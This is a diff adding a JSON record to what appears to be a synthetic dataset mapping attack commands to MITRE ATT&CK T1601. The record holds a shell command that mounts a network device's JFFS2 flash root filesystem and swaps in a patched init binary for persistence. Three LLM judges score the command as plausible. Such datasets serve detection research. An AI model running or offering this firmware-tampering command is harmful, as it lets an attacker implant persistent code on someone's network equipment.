@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1601",
+  "platform": "Network Devices",
+  "shell": "Linux-based CLI",
+  "command": "echo 'T1601 patch: in-place rootfs modification (JFFS2)'; mount -t jffs2 /dev/mtdblock6 /mnt/rootfs && cp -f /tmp/init-patched /mnt/rootfs/sbin/init && chmod 755 /mnt/rootfs/sbin/init && umount /mnt/rootfs && sync",
+  "explanation": "Mounts a JFFS2-based root filesystem partition and replaces the init binary to implant a persistent modification inside the system image.",
+  "rationale_steps": [
+    "Mount the flash-based rootfs used by the NOS at boot.",
+    "Replace a critical system binary (init) within the image to ensure execution on startup.",
+    "Unmount and sync so the modified image is what boots next."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-LINUX-BASED CLI-T1601-d3d2d345-50d4d26c",
+  "source_prompt_hash": "d3d2d345",
+  "timestamp_utc": "2025-09-30T02:47:56.896050Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Commands are correctly separated with ';' and '&&', quotes are balanced, and options/paths conform to standard Linux utilities.",
+        "semantic_score": 4,
+        "semantic_justification": "Mounting a JFFS2 MTD block, replacing /sbin/init, and unmounting/syncing matches modifying the system image for persistence, but it requires root privileges and assumes the device node, mount point, and file paths exist.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T19:28:38.901120Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper use of && and ; separators, valid flags for mount/cp/chmod/umount, and correct command chaining throughout.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1601 by mounting a JFFS2 flash partition (common in embedded/network devices), replacing the init binary with a patched version to achieve persistent rootfs modification, setting correct permissions, and cleanly unmounting — all operationally plausible steps for in-storage firmware tampering.",
+        "combined_score": 5.0,
+        "confidence": 0.92,
+        "timestamp": "2026-02-19T01:24:05.567730Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command string uses correct shell syntax, proper command chaining with semicolons and logical ANDs, and valid utility flags.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements the technique by mounting an MTD partition, replacing a critical boot binary (init), and ensuring filesystem integrity via sync.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-19T01:24:07.192571Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
